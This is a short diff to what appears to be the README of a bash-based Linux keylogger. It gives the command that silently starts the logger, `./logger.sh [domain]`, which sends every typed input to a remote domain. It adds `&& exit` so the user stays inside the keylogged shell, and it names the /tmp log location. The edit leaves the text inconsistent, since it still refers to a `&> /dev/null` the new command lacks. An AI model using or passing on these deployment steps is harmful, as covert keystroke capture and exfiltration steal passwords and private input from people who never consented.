@@ -38,7 +38,7 @@ The Linux keylogger is two bash scripts. `connection.sh` is used by the `logger.
 #   -p path: give path to log file to listen to
 #   -l: run the logger with warnings and errors printed
 ```
-To start the keylogger, run the command `./logger.sh [domain] &> /dev/null && exit`. This will silently start the keylogger, and any inputs typed will be sent. The `&& exit` at the end will cause the shell to close on `exit`. Without it, exiting will bring you back to the non-keylogged shell. Remove the `&> /dev/null` to display error messages.
+To start the keylogger, run the command `./logger.sh [domain] && exit`. This will silently start the keylogger, and any inputs typed will be sent. The `&& exit` at the end will cause the shell to close on `exit`. Without it, exiting will bring you back to the non-keylogged shell. Remove the `&> /dev/null` to display error messages.
 
 The `-p` option will specify the location of the temporary log file where all the inputs are sent to. By default, this is `/tmp/`.
 
